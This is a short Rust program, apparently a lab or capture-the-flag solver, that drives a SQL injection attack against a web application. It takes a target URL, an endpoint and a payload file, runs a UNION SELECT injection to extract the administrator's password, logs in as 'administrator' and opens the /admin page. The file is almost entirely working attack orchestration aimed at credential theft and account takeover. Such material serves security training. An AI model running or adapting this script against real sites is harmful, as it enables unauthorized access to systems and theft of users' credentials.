use clap::{Parser, Subcommand};
use my_request::*;
use sqli::*;
use std::path::PathBuf;

#[derive(Parser)]
struct Args {
    #[arg(long, short)]
    url: String,

    #[arg(long, short)]
    endpoint: String,

    #[arg(long, short = 'p', value_name = "payload_password")]
    payload: PathBuf,

    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    Proxy,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();
    let file = args.payload;
    let endpoint = args.endpoint;
    let url = args.url;
    let proxy = args.command.is_some();
    let redirect = RedirectPolicy::Custom;

    let payload = get_file_contents(file).await?;

    let myclient = MyClient::new(url, proxy, redirect);
    println!("Lets look for the table of users");
    let pass = union_select(&myclient, &endpoint, &payload)
        .await?
        .expect("Getting the Password");
    println!("{}", pass);

    myclient.login("administrator", &pass).await?;

    myclient.get_request("/admin", None).await?;
    Ok(())
}
